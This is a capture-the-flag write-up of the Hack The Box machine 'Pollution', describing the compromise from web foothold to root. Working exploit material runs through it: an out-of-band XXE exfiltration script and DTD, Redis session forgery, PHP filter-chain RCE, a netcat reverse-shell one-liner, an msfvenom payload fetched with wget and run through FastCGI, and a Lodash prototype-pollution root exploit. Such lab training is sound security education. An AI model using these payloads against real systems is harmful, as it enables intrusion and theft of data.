---
title: 'HTB Pollution - Hard'
date: 2024-10-21 00:00:00 +0000
categories: [HTB Machines]
tags: [Hard, Linux, HTB]
---

**Pollution** is a hard HTB machine that begins with the enumeration of a virtual host subdomain containing a file that can be leveraged to obtain admin privileges on the parent domain. Subsequently, we can exfiltrate local files by exploiting an **out-of-band (OOB) XXE**. One of the local files contains a password for **Redis**, so we can **replace our session cookie** with a serialized PHP object that bypasses the authentication portal of another vHost.

After that, we can achieve remote code execution as www-data via **PHP filter chains**. Lateral movement is achievable by abusing a **FastCGI service**, and root access-level by exploiting a **prototype pollution vulnerabily** affecting Lodash in an internal API.

**Author's note**: I highly recommend taking breaks while doing this machine, as well as doing some research if you don't know about prototype pollution or XXE. As always, this is an exceptional opportunity to practice scripting. Have fun! :)

<img src="/assets/img/pollution/image.png" alt="Untitled.png" style="width:600px;">

# Reconnaissance

Started with an Nmap scan using [nmap4lazy](https://github.com/duskb1t/nmap4lazy), a simple script I created.

```bash
sudo python3 nmap4lazy.py -t 10.129.228.126

[+] Scanning all TCP ports...

[+] Command being used:

/usr/bin/nmap 10.129.228.126 -p- -sS -Pn -n --min-rate 5000

[+] Open ports: 

22, 80, 6379

[+] NSE Scan in process. This might take a while...

[+] Command being used:

/usr/bin/nmap 10.129.228.126 -sVC -p22,80,6379

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-19 09:37 CDT
Nmap scan report for 10.129.228.126
Host is up (0.0079s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 db:1d:5c:65:72:9b:c6:43:30:a5:2b:a0:f0:1a:d5:fc (RSA)
|   256 4f:79:56:c5:bf:20:f9:f1:4b:92:38:ed:ce:fa:ac:78 (ECDSA)
|_  256 df:47:55:4f:4a:d1:78:a8:9d:cd:f8:a0:2f:c0:fc:a9 (ED25519)
80/tcp   open  http    Apache httpd 2.4.54 ((Debian))
|_http-title: Home
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.54 (Debian)
6379/tcp open  redis   Redis key-value store
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.09 seconds

[+] Script finished successfully
```

This cool webpage received us on port TCP/80.

<img src="/assets/img/pollution/image 1.png" alt="image 1.png" style="width:800px;">

Discovered a ***collect.htb*** domain at the very bottom.

<img src="/assets/img/pollution/image 2.png" alt="image 2.png" style="width:800px;">

Appended it to */etc/hosts*.

```bash
echo -e "10.129.228.126\tcollect.htb" | sudo tee -a /etc/hosts
10.129.228.126	collect.htb
```

Discovered two vHost subdomains using *Ffuf*.

```bash
ffuf -u "http://10.129.228.126" -H "Host: FUZZ.collect.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -fs 26197
forum               [Status: 200, Size: 14098, Words: 910, Lines: 337, Duration: 171ms]
developers          [Status: 401, Size: 469, Words: 42, Lines: 15, Duration: 10ms]
```

Updated the */etc/hosts* file to resolve them.

```bash
sed '$d' /etc/hosts | sudo tee /etc/hosts
echo -e "10.129.228.126\tcollect.htb forum.collect.htb developers.collect.htb" | sudo tee -a /etc/hosts
10.129.228.126	collect.htb forum.collect.htb developers.collect.htb
```

The *forum.collect.htb* subdomain looks juicy for us.

<img src="/assets/img/pollution/image 3.png" alt="image 3.png" style="width:800px;">

The *developers.collect.htb* prompts a login portal. Nothing to do here.

<img src="/assets/img/pollution/image 4.png" alt="image 4.png" style="width:800px;">

Oh boy. We’ve work to do.

<img src="/assets/img/pollution/image 5.png" alt="image 5.png" style="width:800px;">

Let me get a coffee first XD.

<img src="/assets/img/pollution/image 6.png" alt="image 6.png" style="width:600px;">

There is an interesting conversation between *victor* and the *sysadmin* with an attached file.

<img src="/assets/img/pollution/image 7.png" alt="image 7.png" style="width:800px;">

It is an XML-document. We don’t know much about the API yet.

<img src="/assets/img/pollution/image 8.png" alt="image 8.png" style="width:800px;">

Copied the file locally and discovered a request to */set/role/admin.*

```
cat proxy.txt | grep -i collect.htb | sort -u
    <host ip="192.168.1.6">collect.htb</host>
    <host ip="192.168.1.6">forum.collect.htb</host>
    <url><![CDATA[http://collect.htb/set/role/admin]]></url>
    <url><![CDATA[http://collect.htb/]]></url>
    <url><![CDATA[http://forum.collect.htb/forumdisplay.php?fid=2]]></url>
    <url><![CDATA[http://forum.collect.htb/jscripts/inline_edit.js?ver=1821]]></url>
    <url><![CDATA[http://forum.collect.htb/jscripts/jeditable/jeditable.min.js]]></url>
    <url><![CDATA[http://forum.collect.htb/jscripts/rating.js?ver=1821]]></url>
```

There is a base64-encoded chunk of data for both the request and the server response.

<img src="/assets/img/pollution/image 9.png" alt="image 9.png" style="width:800px;">

The request contains a token. This might be sensitive information.

```bash
echo UE9TVCAvc2V0L3JvbGUvYWRtaW4gSF<SNIP> | base64 -d; echo
POST /set/role/admin HTTP/1.1
Host: collect.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=r8qne20hig1k3li6prgk91t33j
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 38

token=ddac62a28254561001277727cb397baf
```

Nothing relevant in the response.

```bash
echo SFRUUC8xLjEgMzAyIEZvdW5kDQpEYXRl<SNIP> | base64 -d ;echo
HTTP/1.1 302 Found
Date: Thu, 22 Sep 2022 21:30:14 GMT
Server: Apache/2.4.54 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: /home
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8
```

# Exploitation

Recreated the POST request with our current session cookie.

<img src="/assets/img/pollution/image 10.png" alt="image 10.png" style="width:800px;">

We’re redirected to the */admin* endpoint. Successfully achieved admin privileges on the webpage.

<img src="/assets/img/pollution/image 11.png" alt="image 11.png" style="width:800px;">

There is a new feature. This may be the API from the forums.

<img src="/assets/img/pollution/image 12.png" alt="image 12.png" style="width:800px;">

Sent the request to the Repeater. Discovered two different type of responses. None of them replied with the user-input… that’s bad for XXE.

```bash
Already existing user: {"Status":"This user already exists"}
Non-existing user: {"Status":"Ok"}
```

Referencing an arbitrary entity like **`&dusk;`** returns an error message. Thus, external entities are not properly sanitized, but we still can’t exfiltrate the output this way.

<img src="/assets/img/pollution/image 13.png" alt="image 13.png" style="width:800px;">

If there is not a firewall blocking outbound traffic, we should be able to exfiltrate the output via HTTP. This is called an out-of-band (OOB) XXE and the steps are directly copied from my CPTS notes xd.

Saved this file as ***dusk.dtd***.

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/hosts">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://10.10.14.171:8081/?content=%file;'>">
```

Served this other as ***index.php***. It will automatically decode the base64-encoded chunk to stdout.

```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

Started a web server on port TCP/8081.

<img src="/assets/img/pollution/image 14.png" alt="image 14.png" style="width:800px;">

Injected the following payload.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE username [ 
  <!ENTITY % remote SYSTEM "http://10.10.14.171:8081/dusk.dtd">
  %remote;
  %oob;
]>
<root><method>POST</method><uri>/auth/register</uri><username>&content;</usermame><password></password></root>
```

<img src="/assets/img/pollution/image 15.png" alt="image 15.png" style="width:800px;">

Successfully exfiltrated the */etc/hosts* file!!!

<img src="/assets/img/pollution/image 16.png" alt="image 16.png" style="width:800px;">

Created this Python PoC to automate the whole process. Here is what it does:

1. Starts a web server using **`threading.Thread()`**.
2. Creates an account, logs in, and abuses the */set/role/admin* endpoint to become admins.
3. Asks for a filename (full path) and creates the files that we need.
4. Exploits the out-of-band XXE vulnerability to exfiltrate the file content. Goes back to step 3.

```python
import os
import requests
import subprocess
import shlex
import sys
import threading
import urllib.parse

def web_server(port=8081):
    if type(port) == int:
        print(f'\n[+] Starting PHP server on port {port}')
        subprocess.run(shlex.split(f'php -S 0.0.0.0:{port}'))

def remove_files():
    if os.path.exists('dusk.dtd'):
        os.remove('dusk.dtd')

    if os.path.exists('index.php'):
        os.remove('index.php')

def create_files(file, lhost):
    with open('dusk.dtd', 'w') as f:
        f.write('''<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource={}">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://{}:8081/?content=%file;'>">'''.format(file, lhost))
    with open('index.php', 'w') as f:
        f.write('''<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>''')

def become_admins(target):
    s = requests.Session()

    # register testing:testing user
    s.post(
        url = f'http://{target}/register',
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'collect.htb'
            },
        data = 'username=testing&password=testing'
    )

    # log in
    s.post(
        url = f'http://{target}/login',
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'collect.htb'
            },
        data = 'username=testing&password=testing'
    )

    # become admins
    s.post(
        url = f'http://{target}/set/role/admin',
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'collect.htb'
            },
        data = 'token=ddac62a28254561001277727cb397baf',
        allow_redirects=False
    )

    return s

def exploit_xxe(s, target, lhost):
    payload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE username [ 
  <!ENTITY % remote SYSTEM "http://{}:8081/dusk.dtd">
  %remote;
  %oob;
]>
<root><method>POST</method><uri>/auth/register</uri><username>&content;</usermame><password></password></root>'''.format(lhost)
    s.post(
        url = f'http://{target}/api',
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'collect.htb'
            },
        data = f'manage_api={urllib.parse.quote(payload)}'
    )

def main():
    TARGET = '10.129.161.15' # machine address
    LHOST = '10.10.14.171' # tun0 address
    try:
        # start web server TCP/8081
        threads = []
        thread = threading.Thread(target=web_server)
        thread.start()
        threads.append(thread)
        
        s = become_admins(TARGET)

        while True:
            remove_files()
            file_to_read = input('\n[>] Insert file or [CTRL]+[C]: ')
            create_files(file_to_read, LHOST)
            exploit_xxe(s, TARGET, LHOST)

    except KeyboardInterrupt:
        print('\n[!] Keyboard interrupt detected. Quitting!')
        sys.exit(1)

    finally:
        remove_files()
        for t in threads:
            t.join()

main()
```

Note: Make sure you change the global variables.

Successfully dumped the file.

<img src="/assets/img/pollution/image 17.png" alt="image 17.png" style="width:800px;">

The */etc/apache2/sites-enabled/developers.collect.htb.conf* file disclosed the full path for an authentication file. Let’s try to exfiltrate it.

```bash
echo PFZpcnR1YWxIb3N0ICo6ODA<SNIP> | base64 -d; echo
<SNIP>
	<Directory "/var/www/developers">
		AuthType Basic
		AuthName "Restricted Content"
		AuthUserFile /var/www/developers/.htpasswd
		Require valid-user
	</Directory>
<SNIP>
```

The *.htpasswd* file contained clear-text credentials.

```bash
developers_group:$apr1$MzKA5yXY$DwEz.jxW9USWo8.goD7jY1
```

Successfully cracked the hash using *Hashcat*.

```bash
hashcat --help | grep '$apr1'
   1600 | Apache $apr1$ MD5, md5apr1, MD5 (APR) | FTP, HTTP, SMTP, LDAP Server
   
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz; sudo chmod 777 /usr/share/wordlists/rockyou.txt

hashcat -m 1600 hash /usr/share/wordlists/rockyou.txt
$apr1$MzKA5yXY$DwEz.jxW9USWo8.goD7jY1:r0cket
```

Successfully logged in via HTTP Basic Authentication as *developers_group:r0cket*.

<img src="/assets/img/pollution/image 18.png" alt="image 18.png" style="width:800px;">

Another login portal. Damn it.

<img src="/assets/img/pollution/image 19.png" alt="image 19.png" style="width:800px;">

Headed back to the PoC. Exfiltrated the contents of *index.php*. It is including a *bootstrap.php* file.

<img src="/assets/img/pollution/image 20.png" alt="image 20.png" style="width:800px;">

Collected a password for *TCP/6379* (Redis) from it.

```bash
redis:COLLECTR3D1SPASS
```

<img src="/assets/img/pollution/image 21.png" alt="image 21.png" style="width:800px;">

Successfully logged in with that password using *redis-cli*.

```bash
redis-cli -h 10.129.161.15

10.129.161.15:6379> info
NOAUTH Authentication required.

10.129.161.15:6379> AUTH COLLECTR3D1SPASS
OK
```

Note: You can learn about Redis in [Pentesting Redis](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis) by HackTricks.

Couldn’t write a webshell :(

```bash
10.129.161.15:6379> config set dir /var/www/developers/
OK
10.129.161.15:6379> config set dbfilename dusk.php
OK
10.129.161.15:6379> set test "<?php system($_GET['fc8358bcf09e4b3947d1975622a9df14']);?>"
OK
10.129.161.15:6379> save
(error) ERR
```

There is a database with the active session cookies.

```bash
> INFO keyspace
# Keyspace
db0:keys=5,expires=4,avg_ttl=414800

> KEYS *
1) "PHPREDIS_SESSION:0vrb3ojds81mapi4d7k3dgqo2c"
2) "PHPREDIS_SESSION:vuoha0ekbp8995b6ajii8h688b"
3) "PHPREDIS_SESSION:puvaukvid2hbgj9h1s3b00i931"
```

The empty one belongs to the developers vHost subdomain.

```bash
> get "PHPREDIS_SESSION:0vrb3ojds81mapi4d7k3dgqo2c"
""

get "PHPREDIS_SESSION:puvaukvid2hbgj9h1s3b00i931"
"username|s:7:\"testing\";role|s:5:\"admin\";"
```

Went back to the *index.php* file. It uses a loose comparison to validate the *auth* flag.

```bash
echo -n PD9waHANCnJlcXVp<SNIP> | base64 -d; echo
<?php
require './bootstrap.php';

if (!isset($_SESSION['auth']) or $_SESSION['auth'] != True) {
    die(header('Location: /login.php'));
}

if (!isset($_GET['page']) or empty($_GET['page'])) {
    die(header('Location: /?page=home'));
}

$view = 1;

?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="assets/js/tailwind.js"></script>
    <title>Developers Collect</title>
</head>

<body>
    <div class="flex flex-col h-screen justify-between">
        <?php include("header.php"); ?>
        
        <main class="mb-auto mx-24">
            <?php include($_GET['page'] . ".php"); ?>
        </main>

        <?php include("footer.php"); ?>
    </div>

</body>

</html>
```

Crafted a serialized cookie locally using an interactive PHP shell.

```bash
php -a
Interactive shell

php > echo '"auth|' . serialize(true) . '"';
"auth|b:1;"

php > exit
```

Headed back to Redis and changed the cookie’s value.

```bash
> set "PHPREDIS_SESSION:0vrb3ojds81mapi4d7k3dgqo2c" "auth|b:1;"
OK
> get "PHPREDIS_SESSION:0vrb3ojds81mapi4d7k3dgqo2c"
"auth|b:1;"
```

Successfully bypassed the authentication portal.

<img src="/assets/img/pollution/image 22.png" alt="image 22.png" style="width:800px;">

The *index.php* file uses **`include`** without sanitization. Both **`include`** and **`require`** can read files and execute PHP code, so this is a terrible practice.

```php
<SNIP>
<body>
    <div class="flex flex-col h-screen justify-between">
        <?php include("header.php"); ?>
        
        <main class="mb-auto mx-24">
            <?php include($_GET['page'] . ".php"); ?>
<SNIP>
```

Dumped the *login.php* file using PHP filters. Please note that it appends the PHP extension, so we don’t have to specify it.

```
GET /?page=php://filter/convert.base64-encode/resource=login HTTP/1.1
```

<img src="/assets/img/pollution/image 23.png" alt="image 23.png" style="width:800px;">

Discovered more credentials from it. This time for a SQL server running locally.

```
webapp_user:Str0ngP4ssw0rdB*12@1
```

<img src="/assets/img/pollution/image 24.png" alt="image 24.png" style="width:800px;">

There is no clear way to poison logs or session cookies, or even a file upload functionality, so I will be chaining PHP filters with this amazing [script](https://github.com/synacktiv/php_filter_chain_generator) to achieve RCE. [This video](https://youtu.be/TnLELBtmZ24?si=TxdamZ97fRWJXHl7) by 0xdf explains it in detail.

First, I will test it locally. Started an HTTP server with an *index.php* that includes files and crafted a payload to list local files using the script.

```bash
wget https://github.com/synacktiv/php_filter_chain_generator/raw/refs/heads/main/php_filter_chain_generator.py

python3 php_filter_chain_generator.py --chain '<?php system("ls -l");?>'
[+] The following gadget chain will generate the following code : <?php system("ls -l");?> (base64 value: PD9waHAgc3lzdGVtKCJscyAtbCIpOz8+)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode
<SNIP>
```

Successfully read the secret file. This should work. Let’s move to the machine.

<img src="/assets/img/pollution/image 25.png" alt="image 25.png" style="width:800px;">

Created another payload. This time for a webshell.

```bash
python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]);?>'
[+] The following gadget chain will generate the following code : <?php system($_GET["c"]);?> (base64 value: PD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOz8+)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode
<SNIP>
```

Successfully achieved RCE as *www-data*.

```
GET /?page=php://filter/convert.iconv.UTF8.CSISO2022KR<SNIP>&c=whoami HTTP/1.1
```

<img src="/assets/img/pollution/image 26.png" alt="image 26.png" style="width:800px;">

Started the Netcat listener `nc -nlvp 4444` and used this one-liner from [RevShells](https://www.revshells.com/).

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f
```

Established a reverse shell as *www-data*, and upgraded it to a pseudo-interactive TTY using Python.

```bash
www-data@pollution:~/developers$ whoami
www-data

www-data@pollution:~/developers$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# Lateral Movement

Port *TCP/3000* and *TCP/9000* are listening on localhost. Let’s enumerate the first one.

<img src="/assets/img/pollution/image 27.png" alt="image 27.png" style="width:800px;">

We can interact with the web application using *curl*.

```bash
$ curl localhost:3000
{"Status":"Ok","Message":"Read documentation from api in /documentation"}

$ curl localhost:3000/documentation
{"Documentation":{"Routes":{"/":{"Methods":"GET","Params":null},"/auth/register":{"Methods":"POST","Params":{"username":"username","password":"password"}},"/auth/login":{"Methods":"POST","Params":{"username":"username","password":"password"}},"/client":{"Methods":"GET","Params":null},"/admin/messages":{"Methods":"POST","Params":{"id":"messageid"}},"/admin/messages/send":{"Methods":"POST","Params":{"text":"message text"}}}}}
```

Updated the */etc/proxychains4.conf* file in the PwnBox and started the *Chisel* server.

```bash
head -n -2 /etc/proxychains4.conf | sudo tee /etc/proxychains4.conf
echo 'socks5 127.0.0.1 1080' | sudo tee -a /etc/proxychains4.conf

sudo ./chisel_1.10.1_linux_amd64 server -p 1234 --reverse --socks5
```

Uploaded the binary and forwarded the service as follows.

```bash
$ ./chisel_1.10.1_linux_amd64 client 10.10.14.171:1234 R:3000:127.0.0.1:3000
```

We can now access the internal webapp.

<img src="/assets/img/pollution/image 28.png" alt="image 28.png" style="width:800px;">

Headed back to the *proxy_history.txt* file, where all this started. There is an interesting request.

<img src="/assets/img/pollution/image 29.png" alt="image 29.png" style="width:800px;">

It is a POST request for authentication using *user:pass* credentials.

```bash
echo UE9TVCAvYXV0aC9sb2dpbiBI<SNIP> | base64 -d; echo
POST /auth/login HTTP/1.1
Host: 127.0.0.1:3000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
If-None-Match: W/"32-U/dsaK6mTQXrX7DlXxCh5L8YLF8"
Content-Type: application/x-www-form-urlencoded
Content-Length: 37

{"username":"user","password":"pass"}
```

No luck.

<img src="/assets/img/pollution/image 30.png" alt="image 30.png" style="width:800px;">

Uploaded and executed [Pspy64](https://github.com/DominicBreuker/pspy/releases/tag/v1.2.1). The *php-fpm* service is running as victor, the only user on the box.

```bash
$ pspy64 -pf -i 1000
```

<img src="/assets/img/pollution/image 31.png" alt="image 31.png" style="width:800px;">

We have full control over the *FastCGI* service.

```bash
$ grep -r "9000" /etc 2>/dev/null
/etc/nginx/sites-available/default:	#	fastcgi_pass 127.0.0.1:9000;
/etc/php/8.1/fpm/pool.d/www.conf:listen = 127.0.0.1:9000

$ cat /etc/php/8.1/fpm/pool.d/www.conf | grep -v ';' | sort -u

[victor]
[www]
group = victor
group = www-data
listen = /run/php/php8.1-fpm.sock
listen = 127.0.0.1:9000
listen.group = www-data
listen.owner = www-data
pm = dynamic
pm.max_children = 5
pm.max_spare_servers = 3
pm.min_spare_servers = 1
pm.start_servers = 2
user = victor
user = www-data
```

Created an stageless payload using `msfvenom` and served it on the HTTP server.

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.171 LPORT=4444 -f elf -o dusk.elf
```

Uploaded [this script](https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75) to the target and executed PHP code to establish a reverse shell.

```bash
$ python3 fpm.py -c '<?php system("wget 10.10.14.171:8000/dusk.elf -O /tmp/dusk.elf; chmod +x /tmp/dusk.elf; /tmp/dusk.elf"); ?>' localhost /var/www/developers/index.php
```

Successfully moved laterally to the user *victor* and read the user flag.

```bash
$ whoami
victor

$ id
uid=1002(victor) gid=1002(victor) groups=1002(victor)

$ cat /home/victor/user.txt
<REDACTED>
```

# Privilege Escalation

We can read the Pollution API’s source code.

```bash
$ pwd
/home/victor/pollution_api

$ ls -lah
total 116K
drwxr-xr-x  8 victor victor 4.0K Nov 21  2022 .
drwx------ 16 victor victor 4.0K Nov 21  2022 ..
drwxr-xr-x  2 victor victor 4.0K Nov 21  2022 controllers
drwxr-xr-x  2 victor victor 4.0K Nov 21  2022 functions
-rw-r--r--  1 victor victor  528 Sep  2  2022 index.js
-rwxr-xr-x  1 victor victor  574 Aug 26  2022 log.sh
drwxr-xr-x  5 victor victor 4.0K Nov 21  2022 logs
drwxr-xr-x  2 victor victor 4.0K Nov 21  2022 models
drwxr-xr-x 97 victor victor 4.0K Nov 21  2022 node_modules
-rw-r--r--  1 victor victor  71K Aug 26  2022 package-lock.json
-rw-r--r--  1 victor victor  160 Aug 26  2022 package.json
drwxr-xr-x  2 victor victor 4.0K Nov 21  2022 routes
```

First, we need to get authenticated.

<img src="/assets/img/pollution/image 32.png" alt="image 32.png" style="width:800px;">

Registered an account.

<img src="/assets/img/pollution/image 33.png" alt="image 33.png" style="width:800px;">

Logged in.

<img src="/assets/img/pollution/image 34.png" alt="image 34.png" style="width:800px;">

Accessing the */admin* endpoint returns an error.

<img src="/assets/img/pollution/image 35.png" alt="image 35.png" style="width:800px;">

The JWT *role* claim needs to be admin. We’re given the *user* role by default.

<img src="/assets/img/pollution/image 36.png" alt="image 36.png" style="width:800px;">

We have access to the JWT secret key.

<img src="/assets/img/pollution/image 37.png" alt="image 37.png" style="width:800px;">

Crafted a privileged JWT with [jwt.io](https://jwt.io/).

<img src="/assets/img/pollution/image 38.png" alt="image 38.png" style="width:800px;">

Still not work. It is also validating the user’s role from the database, so let’s change that.

```sql
mysql -u webapp_user -p'Str0ngP4ssw0rdB*12@1' -h localhost

use pollution_api;
show tables;
select * from users;
update users set role = 'admin' where username = 'dusk';
```

<img src="/assets/img/pollution/image 39.png" alt="image 39.png" style="width:800px;">

Nice! We’re now admins.

<img src="/assets/img/pollution/image 40.png" alt="image 40.png" style="width:800px;">

Let’s take a look at the *admin.js*. There are two routes using custom functions.

<img src="/assets/img/pollution/image 41.png" alt="image 41.png" style="width:800px;">

The `messages_send` function merges the user-input using the *lodash* package.

<img src="/assets/img/pollution/image 42.png" alt="image 42.png" style="width:800px;">

If we run `npm audit`, we can see a critical vulnerability affecting the version being used.

```bash
sudo apt install npm -y
npm audit
```

<img src="/assets/img/pollution/image 43.png" alt="image 43.png" style="width:800px;">

Referred to the [official NodeJS documentation](https://nodejs.org/api/child_process.html). We can try shadowing the shell option (or attribute) with the prototype pollution vulnerability.

<img src="/assets/img/pollution/image 44.png" alt="image 44.png" style="width:800px;">

Started the Netcat listener `nc -nlvp 4444` and submitted the following request. Do not forget to attach a dummy value for the text key in the JSON data, or it won’t be merged.

```
POST /admin/messages/send HTTP/1.1
Host: 127.0.0.1:3000
X-Access-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZHVzayIsImlzX2F1dGgiOnRydWUsInJvbGUiOiJhZG1pbiIsImlhdCI6MTcyOTQ2MjE4MiwiZXhwIjoxNzI5NDY1NzgyfQ.a_q7l27R4WaIdj0N1EQz0m7Q_9zr6j5cYlnXbfeDqws
Content-Type: application/json
Content-Length: 60

{"text":"dummyvalue","__proto__": {"shell":"/tmp/dusk.elf"}}
```

Note: I used the previously generated payload from *msfvenom* but you can also use a one-liner.

Successfully established a reverse shell as root and read the flag. GGs!!!

```
# whoami
root

# id
uid=0(root) gid=0(root) groups=0(root)

# cat /root/root.txt
<REDACTED>
```

<img src="/assets/img/pollution/image 45.png" alt="image 45.png" style="width:600px;">